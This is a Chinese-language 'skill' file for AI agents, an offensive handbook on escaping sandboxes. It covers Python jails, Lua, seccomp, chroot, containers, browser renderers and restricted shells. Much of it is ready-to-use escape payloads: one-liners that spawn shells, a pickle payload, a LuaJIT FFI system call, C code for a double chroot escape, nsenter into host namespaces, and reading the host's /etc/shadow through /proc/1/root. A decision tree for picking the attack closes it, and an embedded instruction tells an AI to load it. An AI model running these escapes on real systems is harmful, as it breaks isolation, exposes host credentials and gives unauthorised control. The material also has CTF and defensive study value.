# 技能：沙盒逃逸 — 专家攻击手册

> **AI 加载指令**：涵盖 Python、Lua、seccomp、chroot、Docker/容器和浏览器沙盒环境的专家级沙盒逃逸技巧。包括 CTF pyjail 模式、seccomp 架构混淆、chroot 文件描述符泄露、命名空间逃逸和 Mojo IPC 滥用。源自 ctf-wiki 沙盒章节和现实世界的容器逃逸。基础模型常忽略沙盒类型的区别，并应用错误的逃逸技巧。

## 0. 相关路由

- [browser-exploitation-v8](../browser-exploitation-v8/SKILL.md) — 在浏览器沙盒逃逸前对渲染器进行 V8 利用
- [container-escape-techniques](../container-escape-techniques/SKILL.md) — Docker/容器特定逃逸技巧
- [kernel-exploitation](../kernel-exploitation/SKILL.md) — 用于容器/命名空间逃逸的内核利用
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) — 逃逸后的权限提升

### 高级参考

- [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) — 完整 pyjail 方法论：`__builtins__` 恢复、关键字绕过、AST 绕过、pickle 逃逸
- [SECCOMP_BYPASS.md](./SECCOMP_BYPASS.md) — 架构混淆、io_uring 绕过、ptrace 绕过、允许的系统调用链

---

## 1. 沙盒类型识别

| 沙盒类型 | 指示器 | 典型环境 |
|---|---|---|
| Python 沙盒 (pyjail) | 有限的内置函数、过滤的关键字、`exec`/`eval` 可用 | CTF、在线评测、Jupyter |
| Lua 沙盒 | 没有 `os`、`io` 模块；受限制的元表 | 游戏脚本、配置 |
| seccomp | 系统调用过滤、`prctl(PR_SET_SECCOMP)` | CTF pwn、容器加固 |
| chroot | 改变根文件系统、有限的 `/proc` 访问 | 传统隔离 |
| Docker/容器 | 命名空间、cgroups、减少的权限 | 云、微服务 |
| 浏览器 (渲染器) | 操作系统级沙盒 (Linux 上的 seccomp-bpf + 命名空间) | Chrome、Firefox |
| 命名空间隔离 | PID/挂载/网络/用户命名空间 | 容器运行时 |

---

## 2. Python 沙盒逃逸 (概述)

参见 [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) 获取完整方法论。

### 快速参考

| 技巧 | 一行代码 |
|---|---|
| 子类遍历 | `().__class__.__bases__[0].__subclasses__()` → 查找 `os._wrap_close` → `__init__.__globals__['system']` |
| 导入恢复 | `__builtins__.__import__('os').system('sh')` |
| getattr 绕过 | `getattr(getattr(__builtins__, '__imp'+'ort__'), '__call__')('os')` |
| chr 构建 | `eval(chr(95)+chr(95)+'import'+chr(95)+chr(95))` |
| Pickle 逃逸 | `pickle.loads(b"cos\nsystem\n(S'sh'\ntR.")` |
| 代码对象 | 构建 `types.CodeType(...)` 然后用自定义字节码 `exec()` |

---

## 3. Lua 沙盒逃逸

### 限制环境绕过

```lua
-- 如果调试库可用：
debug.getinfo(1)                    -- 信息泄露
debug.getregistry()                 -- 访问全局注册表
debug.getupvalue(func, 1)           -- 读取闭包变量
debug.setupvalue(func, 1, new_val)  -- 重写 upvalues

-- 通过 debug 恢复 os 模块：
local getupvalue = debug.getupvalue
-- 遍历已知函数的上值以找到对 os/io 的引用

-- 如果 loadstring 可用：
loadstring("os.execute('sh')")()

-- 如果 string.dump 可用：
-- 转储函数字节码，修补它，加载修改后的函数

-- 元表逃逸：
-- 如果 rawset/rawget 被阻止但存在 __index/__newindex：
-- 打造元表链以访问受限的全局变量
```

### Lua FFI 逃逸 (LuaJIT)

```lua
-- LuaJIT FFI 提供对 C 函数的访问
local ffi = require("ffi")
ffi.cdef[[ int system(const char *command); ]]
ffi.C.system("sh")

-- 如果 require 被阻止但 ffi 已预加载：
-- 通过 package.loaded 或 debug.getregistry 找到 ffi
```

---

## 4. chroot 逃逸

| 技巧 | 条件 | 方法 |
|---|---|---|
| 对真实根打开 fd | 从 chroot 外部泄露的文件描述符 | `fchdir(leaked_fd)` 然后执行 `chroot(".")` |
| 双重 chroot | 进程在 chroot 内部是 root | `mkdir("x"); chroot("x"); chdir("../../../..")` |
| TIOCSTI ioctl | 终端访问 (fd 0 是一个 TTY) | 通过 `ioctl(0, TIOCSTI, &c)` 向父 shell 注入按键 |
| /proc 访问 | chroot 内部挂载了 /proc | `/proc/1/root/` → 访问真实根文件系统 |
| ptrace | CAP_SYS_PTRACE | 附加到 chroot 外部的进程 |
| 挂载命名空间 | 特权 | 将真实根挂载到 chroot |

### 双重 chroot 逃逸

```c
// 必须在 chroot 内部是 root
mkdir("/tmp/escape", 0755);
chroot("/tmp/escape");          // 在旧的 chroot 内部创建新的 chroot
// 旧的当前工作目录现在在新的 chroot 外部
// 向真实根导航：
for (int i = 0; i < 100; i++) chdir("..");
chroot(".");                     // 现在在真实根
execl("/bin/sh", "sh", NULL);
```

---

## 5. 浏览器沙盒逃逸 (概述)

### Chrome 沙盒架构 (Linux)

```
渲染器进程：
  ├── seccomp-bpf (系统调用过滤器)
  ├── PID 命名空间 (隔离的 PID)
  ├── 网络命名空间 (无直接网络)
  ├── 挂载命名空间 (最小的文件系统)
  └── 减少的权限 (无 CAP_SYS_ADMIN 等)
```

### 逃逸向量

| 向量 | 描述 |
|---|---|
| Mojo IPC 漏洞 | 浏览器进程中 Mojo 接口处理器的 UAF 或类型混淆 |
| 共享内存损坏 | 渲染器和浏览器之间损坏共享内存段 |
| GPU 进程漏洞 | 利用 GPU 进程 (沙盒较少) 作为跳板 |
| 内核漏洞 | 直接通过内核漏洞逃逸 (绕过所有沙盒) |
| 信号处理 | 跨沙盒边界信号传递中的竞争条件 |

### Mojo 接口攻击模式

```
1. 渲染器 RCE 实现 (通过 V8/Blink 漏洞)
2. 从渲染器枚举可用的 Mojo 接口
3. 找到易受攻击的接口 (消息处理中的 UAF、参数验证中的整数溢出)
4. 构造恶意 Mojo 消息 → 在浏览器进程中触发漏洞
5. 浏览器进程未沙盒化 → 完全系统访问
```

---

## 6. 命名空间逃逸

### 用户命名空间提升

```bash
# 如果允许创建用户命名空间 (无特权):
unshare -Urm  # 以 root 在内部创建新的用户 + 挂载命名空间
# 在命名空间内：可以挂载、修改等
# 逃逸需要内核漏洞或配置错误
```

### PID 命名空间逃逸

```bash
# 如果 /proc 来自主机 (配置错误的容器):
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# 进入 init 进程命名空间 → 访问主机
```

### 挂载命名空间技巧

```bash
# 如果可以通过 /proc/1/root 看到主机文件系统:
ls -la /proc/1/root/  # 主机根文件系统
cat /proc/1/root/etc/shadow  # 读取主机文件

# 如果可以挂载:
mount -t proc proc /proc
# 访问主机 /proc 条目
```

---

## 7. RBASH / 限制性 Shell 逃逸

| 技巧 | 方法 |
|---|---|
| vi/vim | `:!/bin/bash` 或 `:set shell=/bin/bash` 然后执行 `:shell` |
| less/more | `!/bin/bash` |
| awk | `awk 'BEGIN {system("/bin/bash")}'` |
| find | `find / -exec /bin/bash \;` |
| python/perl/ruby | `python -c 'import pty;pty.spawn("/bin/bash")'` |
| ssh | `ssh user@host -t /bin/bash` |
| 环境 | `export PATH=/usr/bin:/bin; /bin/bash` |
| cp | 将 `/bin/bash` 复制到允许的目录 |
| git | `git help config` → 然后在分页器中执行 `!/bin/bash` |
| 编码 | `echo /bin/bash | base64 -d | sh` |

---

## 8. 决策树

```
是什么类型的沙盒？
├── Python 沙盒 (pyjail)？
│   └── 查看 PYTHON_SANDBOX_ESCAPE.md
│       ├── __builtins__ 可用？ → 直接导入
│       ├── 子类遍历： ().__class__.__bases__[0].__subclasses__()
│       ├── 关键字被过滤？ → chr()/getattr() 构建
│       └── eval/exec 可用？ → 代码对象操作
│
├── Lua 沙盒？
│   ├── 调试库可用？ → getregistry/getupvalue
│   ├── FFI 可用 (LuaJIT)？ → ffi.C.system()
│   ├── loadstring 可用？ → 加载任意代码
│   └── 所有受限？ → 元表链利用
│
├── seccomp 过滤器？
│   └── 查看 SECCOMP_BYPASS.md
│       ├── 架构混淆 (32 位系统调用从 64 位)
│       ├── 允许的系统调用 → ORW 链
│       ├── io_uring 允许？ → 通过 io_uring 绕过
│       └── ptrace 允许？ → 调试子进程
│
├── chroot 监禁？
│   ├── chroot 内部是 root？ → 双重 chroot 逃逸
│   ├── 泄露 fd？ → fchdir 到真实根
│   ├── /proc 挂载？ → /proc/1/root 访问
│   └── 终端访问？ → TIOCSTI 注入
│
├── 容器 / Docker？
│   ├── 特权容器？ → 挂载主机，加载内核模块
│   ├── 挂载了 docker.sock？ → docker API → 逃逸
│   ├── 查看 ../container-escape-techniques/SKILL.md
│   └── 内核漏洞 → 完全逃逸
│
├── 浏览器沙盒？
│   ├── 已有渲染器 RCE？ → 针对浏览器逃逸的 Mojo IPC
│   ├── GPU 进程可访问？ → 较少沙盒化的跳板
│   └── 内核漏洞 → 完全绕过沙盒
│
└── 限制性 Shell (rbash)？
    └── 找到任何交互式程序 (vi, less, python, awk, git)
```
